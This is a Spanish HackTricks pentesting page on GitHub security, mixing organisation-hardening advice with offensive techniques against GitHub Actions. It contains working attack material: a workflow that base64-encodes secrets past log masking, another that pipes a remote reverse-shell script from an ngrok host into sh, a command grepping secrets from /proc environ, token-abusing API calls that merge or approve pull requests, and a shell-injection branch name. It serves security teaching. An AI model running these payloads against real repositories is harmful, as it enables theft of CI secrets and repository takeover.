# Seguridad en Github

<details>

<summary><strong>隆Apoya a HackTricks y obt茅n beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **煤ltima versi贸n de PEASS o descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop).
* Obt茅n [**productos oficiales de PEASS y HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s铆gueme** en **Twitter**  [**@carlospolopm**](https://twitter.com/carlospolopm).

* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) en Github.

</details>

## 驴Qu茅 es Github?

(De [aqu铆](https://kinsta.com/knowledgebase/what-is-github/)) A grandes rasgos, **Github es un sitio web y un servicio basado en la nube que ayuda a los desarrolladores a almacenar y gestionar su c贸digo, as铆 como a realizar un seguimiento y controlar los cambios en su c贸digo**.

### Informaci贸n b谩sica

{% content-ref url="basic-github-information.md" %}
[basic-github-information.md](basic-github-information.md)
{% endcontent-ref %}

## Reconocimiento externo

Los repositorios de Github pueden configurarse como p煤blicos, privados e internos.

* **Privado** significa que solo las personas de la **organizaci贸n** podr谩n acceder a ellos.
* **Interno** significa que solo las personas de la **empresa** (una empresa puede tener varias organizaciones) podr谩n acceder a 茅l.
* **P煤blico** significa que **todo Internet** podr谩 acceder a 茅l.

En caso de que conozcas el **usuario, repositorio u organizaci贸n que deseas atacar**, puedes utilizar **dorks de Github** para encontrar informaci贸n sensible o buscar **filtraciones de informaci贸n sensible en cada repositorio**.

### Dorks de Github

Github permite **buscar algo especificando como alcance un usuario, un repositorio o una organizaci贸n**. Por lo tanto, con una lista de cadenas que van a aparecer cerca de informaci贸n sensible, puedes buscar f谩cilmente informaci贸n sensible potencial en tu objetivo.

Herramientas (cada herramienta contiene su lista de dorks):

* [https://github.com/obheda12/GitDorker](https://github.com/obheda12/GitDorker) ([Lista de dorks](https://github.com/obheda12/GitDorker/tree/master/Dorks))
* [https://github.com/techgaun/github-dorks](https://github.com/techgaun/github-dorks) ([Lista de dorks](https://github.com/techgaun/github-dorks/blob/master/github-dorks.txt))
* [https://github.com/hisxo/gitGraber](https://github.com/hisxo/gitGraber) ([Lista de dorks](https://github.com/hisxo/gitGraber/tree/master/wordlists))

### Filtraciones de Github

Ten en cuenta que los dorks de Github tambi茅n se utilizan para buscar filtraciones utilizando las opciones de b煤squeda de Github. Esta secci贸n est谩 dedicada a las herramientas que **descargar谩n cada repositorio y buscar谩n informaci贸n sensible en ellos** (incluso verificando cierta profundidad de commits).

Herramientas (cada herramienta contiene su lista de expresiones regulares):

* [https://github.com/zricethezav/gitleaks](https://github.com/zricethezav/gitleaks)
* [https://github.com/trufflesecurity/truffleHog](https://github.com/trufflesecurity/truffleHog)
* [https://github.com/eth0izzle/shhgit](https://github.com/eth0izzle/shhgit)
* [https://github.com/michenriksen/gitrob](https://github.com/michenriksen/gitrob)
* [https://github.com/anshumanbh/git-all-secrets](https://github.com/anshumanbh/git-all-secrets)
* [https://github.com/kootenpv/gittyleaks](https://github.com/kootenpv/gittyleaks)
* [https://github.com/awslabs/git-secrets](https://github.com/awslabs/git-secrets)

{% hint style="warning" %}
Cuando busques filtraciones en un repositorio y ejecutes algo como `git log -p`, 隆no olvides que puede haber **otras ramas con otros commits** que contengan secretos!
{% endhint %}

### Forks externos

Es posible **comprometer repositorios abusando de las solicitudes de extracci贸n**. Para saber si un repositorio es vulnerable, en su mayor铆a necesitas leer las configuraciones yaml de las acciones de Github. [**M谩s informaci贸n sobre esto a continuaci贸n**](./#execution-from-a-external-fork).

## Fortalecimiento de la organizaci贸n

### Privilegios de los miembros

Existen algunos **privilegios predeterminados** que se pueden asignar a los **miembros** de la organizaci贸n. Estos se pueden controlar desde la p谩gina `https://github.com/organizations/<org_name>/settings/member_privileges` o desde la [**API de Organizaciones**](https://docs.github.com/en/rest/orgs/orgs).

* **Permisos base**: Los miembros tendr谩n los permisos Ninguno/Lectura/Escritura/Administrador sobre los repositorios de la organizaci贸n. Se recomienda utilizar **Ninguno** o **Lectura**.
* **Creaci贸n de repositorios bifurcados**: Si no es necesario, es mejor **no permitir** a los miembros bifurcar los repositorios de la organizaci贸n.
* **Creaci贸n de p谩ginas**: Si no es necesario, es mejor **no permitir** a los miembros publicar p谩ginas desde los repositorios de la organizaci贸n. Si es necesario, puedes permitir crear p谩ginas p煤blicas o privadas.
* **Solicitudes de acceso a integraciones**: Con esto habilitado, los colaboradores externos podr谩n solicitar acceso a aplicaciones de GitHub o OAuth para acceder a esta organizaci贸n y sus recursos. Por lo general, es necesario, pero si no lo es, es mejor deshabilitarlo.
* _No pude encontrar esta informaci贸n en la respuesta de las APIs, comp谩rtela si la encuentras_
* **Cambio de visibilidad del repositorio**: Si est谩 habilitado, los **miembros** con permisos de **administrador** para el **repositorio** podr谩n **cambiar su visibilidad**. Si est谩 deshabilitado, solo los propietarios de la organizaci贸n pueden cambiar la visibilidad de los repositorios. Si **no** quieres que las personas hagan cosas **p煤blicas**, aseg煤rate de que esto est茅 **deshabilitado**.
* _No pude encontrar esta informaci贸n en la respuesta de las APIs, comp谩rtela si la encuentras_
* **Eliminaci贸n y transferencia de repositorios**: Si est谩 habilitado, los miembros con permisos de **administrador** para el repositorio podr谩n **eliminar** o **transferir** repositorios **p煤blicos** y **privados**.
* _No pude encontrar esta informaci贸n en la respuesta de las APIs, comp谩rtela si la encuentras_
* **Permitir a los miembros crear equipos**: Si est谩 habilitado, cualquier **miembro** de la organizaci贸n podr谩 **crear** nuevos **equipos**. Si est谩 deshabilitado, solo los propietarios de la organizaci贸n pueden crear nuevos equipos. Es mejor tener esto deshabilitado.
* _No pude encontrar esta informaci贸n en la respuesta de las APIs, comp谩rtela si la encuentras_
* **Se pueden configurar m谩s cosas** en esta p谩gina, pero las anteriores son las m谩s relacionadas con la seguridad.
### Configuraci贸n de acciones

Se pueden configurar varias opciones relacionadas con la seguridad para las acciones desde la p谩gina `https://github.com/organizations/<org_name>/settings/actions`.

{% hint style="info" %}
Ten en cuenta que todas estas configuraciones tambi茅n se pueden establecer en cada repositorio de forma independiente.
{% endhint %}

* **Pol铆ticas de acciones de Github**: Te permite indicar qu茅 repositorios pueden ejecutar flujos de trabajo y qu茅 flujos de trabajo deben permitirse. Se recomienda **especificar qu茅 repositorios** deben permitirse y no permitir que se ejecuten todas las acciones.
* [**API-1**](https://docs.github.com/en/rest/actions/permissions#get-allowed-actions-and-reusable-workflows-for-an-organization)**,** [**API-2**](https://docs.github.com/en/rest/actions/permissions#list-selected-repositories-enabled-for-github-actions-in-an-organization)
* **Flujos de trabajo de solicitudes de extracci贸n de bifurcaci贸n de colaboradores externos**: Se recomienda **requerir aprobaci贸n para todos** los colaboradores externos.
* _No pude encontrar una API con esta informaci贸n, comp谩rtela si la encuentras_
* **Ejecutar flujos de trabajo desde solicitudes de extracci贸n de bifurcaci贸n**: Se desaconseja encarecidamente **ejecutar flujos de trabajo desde solicitudes de extracci贸n** ya que los mantenedores del origen de la bifurcaci贸n podr谩n utilizar tokens con permisos de lectura en el repositorio fuente.
* _No pude encontrar una API con esta informaci贸n, comp谩rtela si la encuentras_
* **Permisos de flujo de trabajo**: Se recomienda encarecidamente **solo otorgar permisos de lectura del repositorio**. Se desaconseja otorgar permisos de escritura y crear/aprobar solicitudes de extracci贸n para evitar el abuso del GITHUB\_TOKEN otorgado a los flujos de trabajo en ejecuci贸n.
* [**API**](https://docs.github.com/en/rest/actions/permissions#get-default-workflow-permissions-for-an-organization)

### Integraciones

_隆Av铆same si conoces el punto final de la API para acceder a esta informaci贸n!_

* **Pol铆tica de acceso de aplicaciones de terceros**: Se recomienda restringir el acceso a todas las aplicaciones y permitir solo las necesarias (despu茅s de revisarlas).
* **Aplicaciones de GitHub instaladas**: Se recomienda permitir solo las necesarias (despu茅s de revisarlas).

## Reconocimiento y ataques abusando credenciales

Para este escenario, supongamos que has obtenido acceso a una cuenta de GitHub.

### Con credenciales de usuario

Si de alguna manera ya tienes las credenciales de un usuario dentro de una organizaci贸n, simplemente puedes **iniciar sesi贸n** y verificar qu茅 **roles de empresa y organizaci贸n tienes**, si eres un miembro b谩sico, verifica qu茅 **permisos tienen los miembros b谩sicos**, en qu茅 **grupos** est谩s, qu茅 **permisos tienes** sobre qu茅 **repositorios** y **c贸mo est谩n protegidos los repositorios**.

Ten en cuenta que se puede utilizar **autenticaci贸n de dos factores (2FA)**, por lo que solo podr谩s acceder a esta informaci贸n si tambi茅n puedes **superar esa verificaci贸n**.

{% hint style="info" %}
Ten en cuenta que si logras **robar la cookie `user_session`** (actualmente configurada con SameSite: Lax), puedes **suplantar completamente al usuario** sin necesidad de credenciales o 2FA.
{% endhint %}

Consulta la secci贸n a continuaci贸n sobre [**bypass de protecciones de rama**](./#branch-protection-bypass) en caso de que sea 煤til.

### Con clave SSH de usuario

Github permite a los **usuarios** configurar **claves SSH** que se utilizar谩n como **m茅todo de autenticaci贸n para implementar c贸digo** en su nombre (no se aplica 2FA).

Con esta clave, puedes realizar **cambios en los repositorios donde el usuario tiene algunos privilegios**, sin embargo, no puedes usarla para acceder a la API de GitHub para enumerar el entorno. Sin embargo, puedes **enumerar la configuraci贸n local** para obtener informaci贸n sobre los repositorios y el usuario a los que tienes acceso:
```bash
# Go to the the repository folder
# Get repo config and current user name and email
git config --list
```
Si el usuario ha configurado su nombre de usuario como su nombre de usuario de GitHub, puedes acceder a las **claves p煤blicas que ha configurado** en su cuenta en _https://github.com/\<github\_username>.keys_, puedes verificar esto para confirmar que la clave privada que encontraste se puede utilizar.

Las **claves SSH** tambi茅n se pueden configurar en los repositorios como **claves de implementaci贸n**. Cualquier persona con acceso a esta clave podr谩 **lanzar proyectos desde un repositorio**. Por lo general, en un servidor con diferentes claves de implementaci贸n, el archivo local **`~/.ssh/config`** te dar谩 informaci贸n sobre qu茅 clave est谩 relacionada.

#### Claves GPG

Como se explica [**aqu铆**](broken-reference/), a veces es necesario firmar los commits o podr铆as ser descubierto.

Verifica localmente si el usuario actual tiene alguna clave con:
```shell
gpg --list-secret-keys --keyid-format=long
```
### Con Token de Usuario

Para obtener una introducci贸n sobre [**Tokens de Usuario, consulta la informaci贸n b谩sica**](basic-github-information.md#personal-access-tokens).

Un token de usuario se puede utilizar **en lugar de una contrase帽a** para Git a trav茅s de HTTPS, o se puede utilizar para [**autenticarse en la API mediante autenticaci贸n b谩sica**](https://docs.github.com/v3/auth/#basic-authentication). Dependiendo de los privilegios asociados a 茅l, es posible realizar diferentes acciones.

Un token de usuario se ve as铆: `ghp_EfHnQFcFHX6fGIu5mpduvRiYR584kK0dX123`

### Con Aplicaci贸n Oauth

Para obtener una introducci贸n sobre [**Aplicaciones Oauth de Github, consulta la informaci贸n b谩sica**](basic-github-information.md#oauth-applications).

Un atacante podr铆a crear una **Aplicaci贸n Oauth maliciosa** para acceder a datos/acciones privilegiados de los usuarios que los acepten, probablemente como parte de una campa帽a de phishing.

Estos son los [alcances que una aplicaci贸n Oauth puede solicitar](https://docs.github.com/en/developers/apps/building-oauth-apps/scopes-for-oauth-apps). Siempre se debe verificar los alcances solicitados antes de aceptarlos.

Adem谩s, como se explica en la informaci贸n b谩sica, **las organizaciones pueden otorgar/denegar acceso a aplicaciones de terceros** a informaci贸n/repositorios/acciones relacionadas con la organizaci贸n.

### Con Aplicaci贸n de Github

Para obtener una introducci贸n sobre [**Aplicaciones de Github, consulta la informaci贸n b谩sica**](basic-github-information.md#github-applications).

Un atacante podr铆a crear una **Aplicaci贸n de Github maliciosa** para acceder a datos/acciones privilegiados de los usuarios que los acepten, probablemente como parte de una campa帽a de phishing.

Adem谩s, como se explica en la informaci贸n b谩sica, **las organizaciones pueden otorgar/denegar acceso a aplicaciones de terceros** a informaci贸n/repositorios/acciones relacionadas con la organizaci贸n.

## Abusando de Github Action

Para obtener una introducci贸n sobre [**Github Actions, consulta la informaci贸n b谩sica**](basic-github-information.md#github-actions).

En caso de que puedas **ejecutar acciones de Github arbitrarias** en un **repositorio**, puedes **robar las credenciales secretas de ese repositorio**.

### Ejecuci贸n desde la Creaci贸n del Repositorio

Si los miembros de una organizaci贸n pueden **crear nuevos repositorios** y t煤 puedes ejecutar acciones de Github, puedes **crear un nuevo repositorio y robar las credenciales secretas establecidas a nivel de organizaci贸n**.

### Ejecuci贸n desde una Nueva Rama

Si puedes **crear una nueva rama en un repositorio que ya contiene una Acci贸n de Github** configurada, puedes **modificarla**, **subir** el contenido y luego **ejecutar esa acci贸n desde la nueva rama**. De esta manera, puedes **filtrar las credenciales secretas del repositorio y de la organizaci贸n** (pero necesitas saber c贸mo se llaman).

Puedes hacer que la acci贸n modificada sea ejecutable **manualmente**, cuando se crea una **solicitud de extracci贸n (PR)** o cuando se **env铆a c贸digo** (dependiendo de cu谩nto ruido quieras hacer):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```
### Ejecuci贸n desde un Fork Externo

Si un repositorio est谩 utilizando acciones de GitHub, un atacante podr铆a ser capaz de **crear una Pull Request desde un repositorio bifurcado** inyectando **c贸digo malicioso** en el **flujo de trabajo** de GitHub, y podr铆a ser capaz de **comprometer el repositorio de GitHub** de esa manera.

#### `pull_request`

El desencadenador del flujo de trabajo **`pull_request`** por defecto **evita los permisos de escritura** y el acceso a secretos en el repositorio objetivo. Adem谩s, por defecto, si es la **primera vez** que est谩s **colaborando**, alg煤n **mantenedor** deber谩 **aprobar** la **ejecuci贸n** del flujo de trabajo:

<figure><img src="../../.gitbook/assets/image (4) (2).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Dado que la limitaci贸n por defecto es para los colaboradores de **primera vez**, podr铆as contribuir **solucionando un error v谩lido** y luego enviar **otras Pull Requests para abusar de tus nuevos privilegios de `pull_request`**.

**Prob茅 esto y no funciona**: ~~Otra opci贸n ser铆a crear una cuenta con el nombre de alguien que contribuy贸 al proyecto y elimin贸 su cuenta.~~
{% endhint %}

Sin embargo, para **prevenir** la **comprometaci贸n** del **repositorio** a trav茅s de **`pull_request`**, esto se menciona en la [**documentaci贸n**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories):

> Con la excepci贸n de `GITHUB_TOKEN`, **los secretos no se pasan al runner** cuando se desencadena un flujo de trabajo desde un repositorio bifurcado. El **`GITHUB_TOKEN` tiene permisos de solo lectura** en las Pull Requests **desde repositorios bifurcados**.

Un atacante podr铆a modificar la definici贸n de la Acci贸n de GitHub para ejecutar cosas arbitrarias y agregar acciones arbitrarias. Sin embargo, no podr谩 robar secretos ni sobrescribir el repositorio debido a las limitaciones mencionadas.

Sin embargo, incluso si la acci贸n no menciona Artefactos, 驴podr铆a ser capaz de modificar un Artefacto del repositorio cambiando la acci贸n?? (TODO).

{% hint style="danger" %}
**S铆, si el atacante cambia en la Pull Request la acci贸n de GitHub que se desencadenar谩, su Acci贸n de GitHub ser谩 la que se utilizar谩 y no la del repositorio original.**
{% endhint %}

_Sin embargo, el env铆o de una nueva acci贸n que se desencadena en pull\_request no se desencadenar谩._

#### **`pull_request_target`**

Sin embargo, el desencadenador del flujo de trabajo **`pull_request_target`** tiene **permisos de escritura** en el repositorio objetivo y **acceso a secretos** (y no solicita permiso).

Ten en cuenta que el desencadenador del flujo de trabajo **`pull_request_target`** se **ejecuta en el contexto base** y no en el proporcionado por la PR (para no ejecutar c贸digo no confiable). Para obtener m谩s informaci贸n sobre `pull_request_target`, [**consulta la documentaci贸n**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target).\
Adem谩s, para obtener m谩s informaci贸n sobre este uso peligroso espec铆fico, consulta esta [**publicaci贸n de blog de GitHub**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

Puede parecer que debido a que el flujo de trabajo **ejecutado** es el definido en la **base** y no en la PR, es **seguro** utilizar **`pull_request_target`**, pero hay **algunos casos en los que no lo es**.

#### Inyecci贸n de Script a trav茅s de variables controladas por el atacante

GitHub establece [variables de entorno por defecto](https://docs.github.com/en/actions/learn-github-actions/environment-variables) y si se utilizan contextos, [incluye m谩s](https://docs.github.com/en/actions/learn-github-actions/contexts#github-context). Si alguno de esos **valores** se utiliza en un **lugar peligroso** dentro del flujo de trabajo y puede ser **controlado por el atacante**, podr铆a ocurrir una **inyecci贸n de comandos**.\
Esta vulnerabilidad tambi茅n se [**explica m谩s adelante en esta publicaci贸n**](./#understanding-the-risk-of-script-injections).

#### Ejecuci贸n de checkout no confiable

Si la v铆ctima est谩 utilizando **`pull_request`** o similar para desencadenar la acci贸n, no se aceptar谩 ninguna PR de un fork **hasta que sea aprobada espec铆ficamente**. La acci贸n luego se ejecutar谩 en el contexto de la PR (lo cual es bueno porque significa que ejecutar谩 el c贸digo dentro del fork de las PR), pero **alguien debe aprobarla primero**.

Si la v铆ctima configur贸 el checkout para usar expl铆citamente el desencadenador **`pull_request_target`**, siempre se ejecutar谩, pero utilizando el c贸digo del repositorio base (no el de la PR), por lo que el atacante no puede controlar el c贸digo ejecutado.\
Sin embargo, si la acci贸n tiene un checkout expl铆cito de la PR que obtendr谩 el c贸digo de la PR (y no de la base), utilizar谩 el c贸digo controlado por el atacante. Por ejemplo (ver l铆nea 12 donde se descarga el c贸digo de la PR):
```yaml
# INSECURE. Provided as an example only.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
with:
ref: ${{ github.event.pull_request.head.sha }}

- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
```
El c贸digo potencialmente **no confiable se ejecuta durante `npm install` o `npm build`** como scripts de construcci贸n y paquetes de referencia controlados por el autor de la PR.

{% hint style="danger" %}
Si la acci贸n se ejecuta en un runner autohospedado, el atacante podr铆a comprometer a煤n m谩s el entorno.
{% endhint %}

Un dork de Github para buscar acciones vulnerables es: `event.pull_request pull_request_target extension:yml`, sin embargo, hay diferentes formas de configurar los trabajos para que se ejecuten de manera segura, incluso si la acci贸n est谩 configurada de manera insegura (como usar condicionales sobre qui茅n es el actor que genera la PR).

### Inyecci贸n/Puerta trasera de Github Action

En caso de que de alguna manera logres **infiltrarte en una Github Action**, si puedes escalar privilegios, puedes **robar secretos de los procesos donde se han establecido**. En algunos casos, ni siquiera necesitas escalar privilegios.
```bash
cat /proc/<proc_number>/environ
cat /proc/*/environ | grep -i secret #Suposing the env variable name contains "secret"
```
### Acceso de Github Action a AWS y GCP a trav茅s de OIDC

Consulte las siguientes p谩ginas:

{% content-ref url="../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### Informaci贸n sensible en los registros de Github Actions

Incluso si **Github** intenta **detectar valores secretos** en los registros de las acciones y **evitar mostrarlos**, **otros datos sensibles** que podr铆an haberse generado durante la ejecuci贸n de la acci贸n no se ocultar谩n. Por ejemplo, un JWT firmado con un valor secreto no se ocultar谩 a menos que se [configure espec铆ficamente](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

### GITHUB\_TOKEN

Este "**secreto**" (proveniente de `${{ secrets.GITHUB_TOKEN }}` y `${{ github.token }}`) se otorga cuando el administrador habilita esta opci贸n:

<figure><img src="../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

Este token es el mismo que utilizar谩 una **Aplicaci贸n de Github**, por lo que puede acceder a los mismos puntos finales: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
Github deber铆a lanzar un [**flujo**](https://github.com/github/roadmap/issues/74) que **permita el acceso entre repositorios** dentro de GitHub, para que un repositorio pueda acceder a otros repositorios internos utilizando el `GITHUB_TOKEN`.
{% endhint %}

Puede ver los posibles **permisos** de este token en: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

Tenga en cuenta que el token **caduca despu茅s de que se haya completado el trabajo**.\
Estos tokens se ven as铆: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Algunas cosas interesantes que puede hacer con este token:
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'

# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'

# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% hint style="danger" %}
Ten en cuenta que en varias ocasiones podr谩s encontrar **tokens de usuario de Github dentro de las variables de entorno de las acciones de Github o en los secretos**. Estos tokens pueden otorgarte m谩s privilegios sobre el repositorio y la organizaci贸n.
{% endhint %}

#### Listar secretos en la salida de Github Actions
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
#### Obtener una shell inversa con secretos

En algunos casos, durante una prueba de penetraci贸n, es posible obtener una shell inversa utilizando secretos. Esto puede ser 煤til para acceder de forma remota a un sistema comprometido y ejecutar comandos en 茅l.

Para lograr esto, primero debemos identificar los secretos almacenados en el sistema objetivo. Estos secretos pueden incluir contrase帽as, claves de API, tokens de acceso, entre otros. Una forma com煤n de encontrar estos secretos es buscar en archivos de configuraci贸n, variables de entorno y otros lugares donde puedan estar almacenados.

Una vez que hayamos identificado los secretos, podemos utilizarlos para establecer una conexi贸n de shell inversa. Esto implica configurar un servidor en nuestra m谩quina y hacer que el sistema objetivo se conecte a 茅l. Para lograr esto, podemos utilizar herramientas como Netcat o Meterpreter.

Es importante tener en cuenta que obtener una shell inversa utilizando secretos puede ser una actividad ilegal si no se cuenta con el permiso adecuado. Siempre debemos realizar pruebas de penetraci贸n en entornos controlados y con el consentimiento del propietario del sistema.

Recuerda que la seguridad es fundamental y debemos utilizar nuestros conocimientos de hacking de manera 茅tica y responsable.
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
### Inyecciones de Script <a href="#comprendiendo-el-riesgo-de-las-inyecciones-de-script" id="comprendiendo-el-riesgo-de-las-inyecciones-de-script"></a>

Tenga en cuenta que hay ciertos [**contextos de github**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) cuyos valores son **controlados** por el **usuario** que crea la PR. Si la acci贸n de github est谩 utilizando esos **datos para ejecutar cualquier cosa**, podr铆a llevar a una **ejecuci贸n de c贸digo arbitrario**. Estos contextos suelen terminar con `body`, `default_branch`, `email`, `head_ref`, `label`, `message`, `name`, `page_name`,`ref` y `title`. Por ejemplo (lista de este [**art铆culo**](https://medium.com/tinder/exploiting-github-actions-on-open-source-projects-5d93936d189f)):

* github.event.comment.body
* github.event.issue.body
* github.event.issue.title
* github.head\_ref
* github.pull\_request.\*
* github.\*.\*.authors.name
* github.\*.\*.authors.email

Tenga en cuenta que hay **fuentes menos obvias** de entrada potencialmente no confiable, como los nombres de las ramas y las direcciones de correo electr贸nico, que pueden ser **bastante flexibles en cuanto a su contenido permitido**. Por ejemplo, `zzz";echo${IFS}"hello";#` ser铆a un nombre de rama v谩lido y podr铆a ser un posible vector de ataque para un repositorio objetivo.

#### Ejemplo de un ataque de inyecci贸n de script <a href="#ejemplo-de-un-ataque-de-inyecci贸n-de-script" id="ejemplo-de-un-ataque-de-inyecci贸n-de-script"></a>

Un ataque de inyecci贸n de script puede ocurrir directamente dentro del script en l铆nea de un flujo de trabajo. En el siguiente ejemplo, una acci贸n utiliza una **expresi贸n para probar la validez del t铆tulo de una pull request**, pero tambi茅n agrega el riesgo de inyecci贸n de script:
```yaml
- name: Check PR title
run: |
title="${{ github.event.pull_request.title }}"
if [[ $title =~ ^octocat ]]; then
echo "PR title starts with 'octocat'"
exit 0
else
echo "PR title did not start with 'octocat'"
exit 1
fi
```
Antes de que se ejecute el script de shell, las expresiones dentro de `${{ }}` se **eval煤an** y luego se sustituyen por los valores resultantes, lo que puede hacerlo **vulnerable a la inyecci贸n de comandos de shell**.

Para inyectar comandos en este flujo de trabajo, el atacante podr铆a crear una solicitud de extracci贸n con un t铆tulo de `a"; ls $GITHUB_WORKSPACE"`:

![Ejemplo de inyecci贸n de script en el t铆tulo de la PR](https://docs.github.com/assets/cb-24920/images/help/images/example-script-injection-pr-title.png)

En este ejemplo, el car谩cter `"` se utiliza para interrumpir la declaraci贸n `title="${{ github.event.pull_request.title }}"`, lo que permite que se ejecute el comando `ls` en el runner. Puedes ver la salida del comando `ls` en el registro:

![Ejemplo del resultado de la inyecci贸n de script](https://docs.github.com/assets/cb-28350/images/help/images/example-script-injection-result.png)

### Acceso a secretos <a href="#accessing-secrets" id="accessing-secrets"></a>

Si est谩s inyectando contenido en un script, es interesante saber c贸mo puedes acceder a los secretos:

* Si el secreto o token se establece como una **variable de entorno**, se puede acceder directamente a trav茅s del entorno utilizando **`printenv`**.
* Si el secreto se utiliza **directamente en una expresi贸n**, el script de shell generado se almacena en disco y es accesible.
* Para una **acci贸n personalizada**, el riesgo puede variar seg煤n c贸mo un programa est茅 utilizando el secreto que obtuvo del **argumento**:

```
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### Abuso de runners autohospedados

La forma de encontrar qu茅 **Acciones de Github se est谩n ejecutando en infraestructura no relacionada con Github** es buscar `runs-on: self-hosted` en la configuraci贸n yaml de la Acci贸n de Github.

Los runners **autohospedados** pueden tener acceso a **informaci贸n extra sensible**, a otros **sistemas de red** (驴puntos finales vulnerables en la red? 驴servicio de metadatos?) o, incluso si est谩 aislado y destruido, **m谩s de una acci贸n podr铆a ejecutarse al mismo tiempo** y la maliciosa podr铆a **robar los secretos** de la otra.

### Envenenamiento de cach茅

Usar la acci贸n de Git [**action/cache**](https://github.com/actions/cache) en cualquier CI ejecutar谩 dos pasos: un paso se llevar谩 a cabo durante el proceso de **ejecuci贸n** cuando se llama y el otro se llevar谩 a cabo despu茅s del **flujo de trabajo** (si la acci贸n de ejecuci贸n devolvi贸 un cache-miss).

* **Acci贸n de ejecuci贸n** - se utiliza para buscar y recuperar la cach茅. La b煤squeda se realiza utilizando la clave de cach茅, y el resultado puede ser un cache-hit (茅xito, datos encontrados en la cach茅) o un cache-miss. Si se encuentra, los archivos y directorios se recuperan de la cach茅 para su uso activo. Si el resultado es un cache-miss, los archivos y directorios deseados se descargan como si fuera la primera vez que se llaman.
* **Acci贸n posterior al flujo de trabajo** - se utiliza para guardar la cach茅. Si el resultado de la llamada a la cach茅 en la acci贸n de ejecuci贸n devuelve un cache-miss, esta acci贸n guardar谩 el estado actual de los directorios que queremos cachear con la clave proporcionada. Esta acci贸n se realiza autom谩ticamente y no necesita ser llamada expl铆citamente.

Las **restricciones de acceso** proporcionan **aislamiento de cach茅** y seguridad al crear un **l铆mite l贸gico entre diferentes ramas** _(por ejemplo: una cach茅 creada para la rama **Feature-A** \[con la base principal] no ser铆a accesible para una solicitud de extracci贸n de la rama **Feature-B** \[con la base principal])_.

La acci贸n de cach茅 primero busca aciertos de cach茅 para una clave y restaura las claves en la rama que contiene la **ejecuci贸n del flujo de trabajo**. Si no hay aciertos en la rama actual, la acci贸n de cach茅 busca la clave y restaura las claves en la rama principal y las ramas ascendentes.

El acceso a una cach茅 est谩 limitado por la rama (actual y principal), lo que significa que se proporciona acceso a todos los **flujos de trabajo** en todas las **ejecuciones** de dicha rama.

Otra nota importante es que GitHub no permite modificaciones una vez que se han enviado las entradas: las entradas de cach茅 son registros de solo lectura.

